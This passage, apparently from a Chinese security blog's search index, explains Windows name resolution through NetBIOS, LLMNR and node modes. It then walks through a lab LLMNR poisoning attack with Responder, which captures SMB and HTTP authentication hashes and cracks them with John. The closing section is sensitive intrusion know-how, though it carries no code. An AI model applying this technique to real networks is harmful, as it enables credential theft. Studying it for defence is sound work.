NetBIOS 缓存。<br>使用 nbtstat -R 命令清除本机的 NetBIOS 缓存。</p></blockquote><h3 id="LLMNR-协议"><a href="#LLMNR-协议" class="headerlink" title="LLMNR 协议"></a>LLMNR 协议</h3><p>DNS 协议的名称解析虽然高效但是需要在局域网中单独配置一台服务器作为 DNS 服务器，NetBIOS 协议的名称解析在一些情况下也需要单独配置一台 WINS 服务器，而且 NetBIOS 协议不支持 IPv6。因此，为了弥补这些不足，微软在 Windows Vista 之后推出了基于端到端的名称解析协议，即 <strong>LLMNR（Link-Local Multicast Name Resolution，本地链路多播名称解析）</strong>。</p><p>LLMNR 也称作多播 DNS ，因为其数据包格式类似于 DNS 的数据包。其监听的端口为 UDP/5355，支持 IPv4 和 IPv6 ，IPv4 的组播地址为 224.0.0.252，IPv6 的组播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3，并且在 Linux 上也实现了此协议。其解析名称的特点是提供了 <strong>点对点</strong> 的名称解析服务，可以让同一子网中的 IPv4 和 IPv6 设备不需要  WINS 或 DNS 服务器就可以解析对方的名称。</p><p>LLMNR 主要用于在网络出现故障的情况下（如 DNS 服务器不可用时）提供名称解析，此外在建立临时对等网络（例如，机场候机区域）方面也非常有用。</p><p><img src="/img/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/2019-08-06_094123.png" alt="Windows 名称解析过程"></p><p>LLMNR 进行名称解析的过程为：</p><ul><li>检查本地 NetBIOS 缓存；</li><li>如果缓存中没有则会向当前子网域（也就是本地链路）发送 UDP 广播，查询主机名对应的 IP 地址；</li><li>当前子网域的其他主机收到广播包后，将查询的名称和自己的主机名进行比较，如果找到了匹配的主机名，这台计算机会传输一条包含了自己 IP 地址的单播信息给请求该查询的主机，如果没有找到则丢弃这个查询；</li><li>如果发送广播后无任何主机响应则请求失败。</li></ul><h2 id="0x02-Windows-系统名称解析顺序"><a href="#0x02-Windows-系统名称解析顺序" class="headerlink" title="0x02 Windows 系统名称解析顺序"></a>0x02 Windows 系统名称解析顺序</h2><p>影响 Windows 系统名称解析的两个因素，分别是：<strong>操作系统版本</strong> 和 <strong>网络节点模式</strong>。</p><h3 id="操作系统版本"><a href="#操作系统版本" class="headerlink" title="操作系统版本"></a>操作系统版本</h3><p>从上述一小节中，可以发现并非所有的操作系统版本都支持上述三种协议。</p><p>Windows 2K，XP，2K3 只支持 DNS 和 NetBIOS。 所以此类版本的 Windows 都是先进行 DNS 名称解析，如果 DNS 解析名称失败，才会进行 NetBIOS 名称解析。</p><p>Windows Vista 之后（包括 2K8，Win7，Win8.x，Win10）都支持上述三种协议，在这类 Windows系统中的名称解析顺序为：先进行 DNS 名称解析，如果 DNS 解析名称失败，则会使用 LLMNR 进行名称解析，最后才会使用 NetBIOS 名称解析。</p><h3 id="网络节点模式"><a href="#网络节点模式" class="headerlink" title="网络节点模式"></a>网络节点模式</h3><p>还有一种影响 Windows 系统名称解析的一个因素就是当前主机的网络节点模式。</p><blockquote><p> 使用 ipconfig /all命令查看本机的网络节点模式。</p></blockquote><p>网络节点模式主要会 <strong>影响 NetBIOS 名称解析过程</strong>，是优先查询 WINS 服务器还是先在子网域中进行广播。具体的节点模式描述如下：</p><ul><li>B-节点（broadcast，广播）</li></ul><p>Windows 使用广播来进行名称注册和名称解析，依据网关的配置，一个 B 节点客户机发送的数据包不能够超出局域网的范围，因此 B 节点并不适合于大型网络。实际上微软修改了标准的 B 节点类型，当 Windows 尝试解析名称时，首先检查 LMHOSTS 名称缓存，如果缓存中没有则会向当前子网发送广播，如果广播依然失败的话，Windows 才会检查实际的 LMHOSTS 文件。</p><ul><li>P-节点（per-to-per，对等）</li></ul><p>这种方法不使用广播，而是在计算机启动时，在网络中的 WINS 服务器上注册它们的名称。当计算机需要解析名称时，它会发送一个解析请求给 WINS 服务器。这种方法只在 WINS 服务器正常运行时有效，如果 WINS 服务器失败，则无法进行名称解析。</p><ul><li>M-节点（mixed，混合）</li></ul><p>Windows 联合使用 B 节点和 P 节点，并且默认使用 B 节点，如果 M 节点不能利用广播进行名称解析，它就使用 P 节点的 WINS 服务器来完成工作。</p><ul><li>H-节点（hybrid，混合）</li></ul><p>同样也是联合使用 B 节点和 P 节点，但工作方式相反，如果使用 WINS 服务器方式不能成功，则使用 B 节点的工作来完成工作。此节点模式也是目前 Windows 系统 <strong>默认使用</strong> 的节点模式。</p><p>综上所述，一种常用的 Windows 名称解析的过程为：</p><ol><li>检查所解析名称是否是本机；</li><li>尝试通过 DNS 缓存进行名称解析；</li><li>尝试通过 hosts 文件进行名称解析；</li><li><strong>尝试将查询请求发送到指定的 DNS 服务器；</strong></li><li>尝试通过 NetBIOS 名称缓存；</li><li><strong>尝试使用 LLMNR 进行名称解析；</strong></li><li><strong>尝试将 NetBIOS 查询请求发送到指定的 WINS 服务器；</strong></li><li><strong>尝试通过广播进行 NetBIOS 名称解析；</strong></li><li>尝试通过 lmhosts 文件进行名称解析。</li></ol><p>值得重点关注的是 4、6、7、8 条，这四种解析行为会尝试发起网络请求，容易受到攻击。</p><h2 id="0x03-利用-Windows-名称解析机制的缺陷进行内网攻击"><a href="#0x03-利用-Windows-名称解析机制的缺陷进行内网攻击" class="headerlink" title="0x03 利用 Windows 名称解析机制的缺陷进行内网攻击"></a>0x03 利用 Windows 名称解析机制的缺陷进行内网攻击</h2><p>常见的利用 Windows 名称解析机制的缺陷进行攻击的技术有 DNS Spoof、NBNS Poison、LLMNR Poison 和 ICMP Redirection。</p><blockquote><p>可以使用 SpiderLabs 的 Responder，或者 ZARP 工具包进行上述攻击。</p></blockquote><p>LLMNR Poison 攻击环境如下：</p><ul><li>攻击者主机（Linux）IP：192.168.253.131</li><li>受害者主机（Windows 8.1） IP：192.168.253.130</li><li>两台主机处于同一个局域网中</li></ul><p>攻击者在启动 Responder 后，当受害者去访问一个在当前局域网中不存在的主机时就会触发 LLMNR Poison 攻击，如下图所示：</p><p><img src="/img/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/2019-08-06_094148.png" alt="受害者使用 net 指令访问一台局域网中并不存在的主机"></p><p><img src="/img/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/2019-08-06_094127.png" alt="Responder 会响应 LLMNR 的广播包并进行了 Poison 攻击"></p><p><img src="/img/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/2019-08-06_094158.png" alt="在受害者主机的 NetBIOS 缓存中已经加入了被 Poison 攻击的主机 IP 记录"></p><p>上述攻击演示中，已经证实了 LLMNR Poison 攻击的效果，可以利用让受害者访问不存在的主机的共享，进行 LLMNR Poison 攻击。这样可以获得受害者主机的 HASH ，拿到 HASH 就可以进行暴力破解了，如果是弱口令的话，就可以爆破出密码。同样也可以利用让受害者访问不存在的 HTTP 服务器进行 401 认证拿到客户端的 HASH，如下图所示：</p><p><img src="/img/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/2019-08-06_100249.png" alt="受害者访问一个不存在的主机的共享"></p><p><img src="/img/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6%E5%8F%8A%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8/2019-08-06_100350.png" alt="LLMNR Poison 攻击同样拿到了 SMB 验证过程中的 HASH"></p><p>获取 HASH 后，可以使用 John 对 HASH 进行暴力破解，获取用户的管理员口令。</p><p><strong>参考文章：</strong><a href="https://xz.aliyun.com/t/1740/">https://xz.aliyun.com/t/1740/</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
      <tag>Windows</tag>
      
      <tag>名称解析</tag>
      
      <tag>DNS</tag>
      
      <tag>NetBIOS</tag>
      
      <tag>LLMNR</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
